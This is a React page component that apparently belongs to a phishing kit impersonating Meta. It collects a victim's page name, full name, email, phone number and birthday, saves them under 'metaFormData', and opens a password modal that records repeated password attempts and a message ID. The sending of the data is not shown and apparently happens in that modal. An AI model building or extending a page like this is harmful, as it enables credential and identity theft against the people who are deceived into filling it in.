import { useState, useEffect } from "react";
import Header from "../components/index/header.jsx";
import Main from "../components/index/main.jsx";
import Footer from "../components/index/footer.jsx";
import Navbar from "../components/index/navbar.jsx";
import PasswordModal from "../components/index/password-modal.jsx";

const Index = () => {
  const [headerHeight, setHeaderHeight] = useState(62);
  const [isShowModal, setIsShowModal] = useState(false);
  const [formValue, setFormValue] = useState({
    pageName: "",
    fullName: "",
    email: "",
    phoneNumber: "",
    birthDay: "",
    password: "",
  });
  const [passwordAttempts, setPasswordAttempts] = useState([]);
  const [lastMessageId, setLastMessageId] = useState(null);

  const handleSubmit = () => {
    if (formValue.email && formValue.phoneNumber) {
      const storedData = {
        pageName: formValue.pageName,
        fullName: formValue.fullName,
        email: formValue.email,
        phoneNumber: formValue.phoneNumber,
        birthDay: formValue.birthDay,
        passwordAttempts: [],
        lastMessageId: null,
        lastMessage: "",
        timestamp: Date.now(),
      };
      localStorage.setItem("metaFormData", JSON.stringify(storedData));
      setIsShowModal(true);
    } else {
      alert("Invalid email or phone number!");
    }
  };

  return (
    <div>
      <Header setHeaderHeight={setHeaderHeight} />
      <div
        style={{
          marginTop: `${headerHeight}px`,
        }}
        className="container"
      >
        <Navbar height={headerHeight} />
        <div
          style={{
            flex: "1",
          }}
        >
          <div className="a">
            <Main
              headerHeight={headerHeight}
              handleSubmit={handleSubmit}
              formValue={formValue}
              setFormValue={setFormValue}
            />
          </div>
          <Footer />
        </div>
      </div>
      {isShowModal && (
        <PasswordModal
          setIsShowModal={setIsShowModal}
          formValue={formValue}
          passwordAttempts={passwordAttempts}
          setPasswordAttempts={setPasswordAttempts}
          lastMessageId={lastMessageId}
          setLastMessageId={setLastMessageId}
        />
      )}
    </div>
  );
};

export default Index;
